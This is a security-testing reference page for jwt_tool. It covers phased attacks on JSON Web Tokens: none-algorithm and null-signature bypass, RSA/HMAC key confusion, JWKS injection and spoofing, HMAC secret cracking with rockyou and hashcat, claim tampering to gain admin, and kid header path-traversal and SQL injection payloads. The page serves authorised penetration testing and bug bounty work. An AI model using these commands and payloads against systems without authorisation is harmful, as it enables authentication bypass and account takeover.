---
id: "jwt-tool"
title: "jwt_tool - JWT Security Testing Toolkit"
type: "tool"
category: "web-application"
subcategory: "authentication"
tags: ["jwt", "authentication", "token", "none-algorithm", "key-confusion", "brute-force", "claim-tampering"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
source_url: "https://github.com/ticarpi/jwt_tool"
related: ["burpsuite", "ffuf"]
updated: "2026-04-14"
---

## Overview

jwt_tool is a Python toolkit for testing, tweaking, and cracking JSON Web Tokens. Supports all known JWT attack vectors including none algorithm bypass, key confusion (RS256->HS256), HMAC brute force, JWKS injection/spoofing, null signature bypass, claim tampering, and header injection. Essential for testing any application using JWT authentication.

## Installation

```bash
# Clone and install
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt

# Or pip install
pip3 install jwt-tool

# Usage
python3 jwt_tool.py <JWT_TOKEN>
```

## Attack Methodology

### Phase 1: Reconnaissance
```bash
# Decode and inspect token
python3 jwt_tool.py eyJ...TOKEN

# Identify: algorithm, claims, expiry, issuer
# Check: is signature verified? are claims processed?
```

### Phase 2: Basic Checks
```bash
# 1. Is token required? Remove it entirely and test
# 2. Is signature checked? Delete last few chars of signature
# 3. Is token persistent? Replay same token multiple times
# 4. Where does token originate? Server-generated vs client-generated
```

### Phase 3: Known Vulnerability Exploits

#### None Algorithm Attack (CVE-2015-9235)
```bash
# Attempts all "none" algorithm variants
python3 jwt_tool.py eyJ...TOKEN -X a

# Variants tested: none, None, NONE, nOnE, etc.
# If server accepts unsigned tokens, you can forge any claims
```

#### Null Signature Attack (CVE-2020-28042)
```bash
# Removes the signature entirely
python3 jwt_tool.py eyJ...TOKEN -X n
```

#### RSA Key Confusion / Algorithm Confusion (CVE-2016-5431)
```bash
# Requires the server's public key
python3 jwt_tool.py eyJ...TOKEN -X k -pk public.pem

# Signs token with RS256 public key using HS256 algorithm
# Works when server uses same key for both verify paths
```

#### JWKS Injection (CVE-2018-0114)
```bash
# Injects attacker-controlled JWK into token header
python3 jwt_tool.py eyJ...TOKEN -X i

# Creates new RSA key pair, embeds public key in token header
# Signs token with the generated private key
```

#### JWKS Spoofing
```bash
# Hosts JWK Set at attacker URL
python3 jwt_tool.py eyJ...TOKEN -X s

# Points jku header to attacker-controlled URL hosting JWKS
```

### Phase 4: HMAC Secret Cracking
```bash
# Dictionary attack
python3 jwt_tool.py eyJ...TOKEN -C -d /usr/share/wordlists/rockyou.txt

# With hashcat (GPU acceleration)
# Extract hash first, then:
hashcat -a 0 -m 16500 jwt_hash.txt wordlist.txt
hashcat -a 0 -m 16500 jwt_hash.txt wordlist.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt_hash.txt ?u?l?l?l?l?l?l?l -i  # brute force

# Common weak secrets: secret, password, admin, key123, ""
```

### Phase 5: Claim Tampering
```bash
# Interactive tamper mode
python3 jwt_tool.py eyJ...TOKEN -T

# Common claim attacks:
# - Change "sub" (subject) to another user ID
# - Change "role" from "user" to "admin"
# - Modify "exp" to extend expiry far into future
# - Change "iss" to test issuer validation
# - Add "admin": true to payload
# - Change "email" to admin@target.com
```

### Phase 6: Header Injection
```bash
# kid (Key ID) attacks
python3 jwt_tool.py eyJ...TOKEN -T
# Tamper kid to:
#   ../../dev/null          (empty key = known signature)
#   /path/to/known/file     (sign with known content)
#   ' UNION SELECT 'key'--  (SQL injection in kid)

# jku (JWK Set URL) tampering
# Point jku to attacker-controlled URL serving JWKS

# x5u (X.509 URL) tampering
# Point x5u to attacker-controlled certificate
```

### Phase 7: Fuzzing
```bash
# Fuzz header values
python3 jwt_tool.py eyJ...TOKEN -I -hc header_name -hv fuzz_list.txt

# Fuzz payload claims
python3 jwt_tool.py eyJ...TOKEN -I -pc claim_name -pv fuzz_values.txt

# Combined fuzzing
python3 jwt_tool.py eyJ...TOKEN -I -hc kid -hv sqli_payloads.txt -pc sub -pv userids.txt
```

### Phase 8: Automated Playbook
```bash
# Run full automated test suite
python3 jwt_tool.py -t https://target.com/api/profile -rc "jwt=eyJ...TOKEN" -M pb

# This runs most attacks automatically and captures traffic
# Use with proxy for detailed analysis
```

## All Attack Flags

| Flag | Attack | CVE |
|------|--------|-----|
| `-X a` | None algorithm bypass | CVE-2015-9235 |
| `-X n` | Null signature | CVE-2020-28042 |
| `-X k -pk KEY` | Key confusion (RSA->HMAC) | CVE-2016-5431 |
| `-X i` | JWKS injection | CVE-2018-0114 |
| `-X s` | JWKS spoofing | - |
| `-C -d FILE` | HMAC secret cracking | - |
| `-T` | Claim/header tampering | - |
| `-I` | Injection/fuzzing mode | - |
| `-M pb` | Full playbook scan | - |

## Key Flags Reference

| Flag | Description |
|------|-------------|
| `-T` | Tamper mode (interactive) |
| `-C` | Crack mode |
| `-d FILE` | Dictionary file for cracking |
| `-pk FILE` | Public key file |
| `-X MODE` | Exploit mode (a/n/k/i/s) |
| `-I` | Injection/fuzz mode |
| `-hc NAME` | Header claim to fuzz |
| `-hv FILE` | Header value wordlist |
| `-pc NAME` | Payload claim to fuzz |
| `-pv FILE/VAL` | Payload value wordlist/value |
| `-M pb` | Playbook mode |
| `-t URL` | Target URL |
| `-rc COOKIE` | Request cookie |
| `-rh HEADER` | Request header |
| `-S` | Sign token with known key |
| `-p PASSWORD` | Password for signing |

## Integration with Other Tools

### With Burp Suite
```bash
# Proxy jwt_tool requests through Burp
python3 jwt_tool.py eyJ...TOKEN -T -p http://127.0.0.1:8080
```

### With Interactsh (OOB via jku/x5u)
```bash
# Tamper jku to point to interactsh URL
# Monitor for callbacks indicating jku is fetched
```

### Extracting JWTs from Traffic
```bash
# From curl response
TOKEN=$(curl -s https://target.com/login -d 'user=test&pass=test' | jq -r '.token')
python3 jwt_tool.py $TOKEN -T

# From Burp/Caido exported requests
grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' requests.txt
```

## Bug Bounty Workflow

1. **Find JWTs**: Check Authorization headers, cookies, URL params, localStorage
2. **Decode**: Understand claims structure, algorithm, key references
3. **Test signature**: Delete chars from signature, observe behavior
4. **Try none algorithm**: `python3 jwt_tool.py TOKEN -X a` with modified claims
5. **Crack weak secrets**: `python3 jwt_tool.py TOKEN -C -d rockyou.txt`
6. **Key confusion**: If RS256, obtain public key and try `-X k`
7. **Tamper claims**: Change user ID, role, permissions
8. **Check kid injection**: SQL injection or path traversal in kid header
9. **Automate**: `python3 jwt_tool.py -t URL -rc "jwt=TOKEN" -M pb`

## Pro Tips

- Always check if removing the token entirely still grants access
- The none algorithm attack works more often than you'd expect
- Obtain public keys from /jwks.json, /.well-known/jwks.json, /oauth/certs
- Key confusion requires the actual RSA public key - check common paths
- Weak HMAC secrets are extremely common - always try cracking
- kid parameter is often vulnerable to path traversal or SQL injection
- Check both cookie-based and header-based JWT handling
- Some apps use JWTs but don't validate them at all on certain endpoints
- Test claim tampering on non-critical endpoints first to understand validation
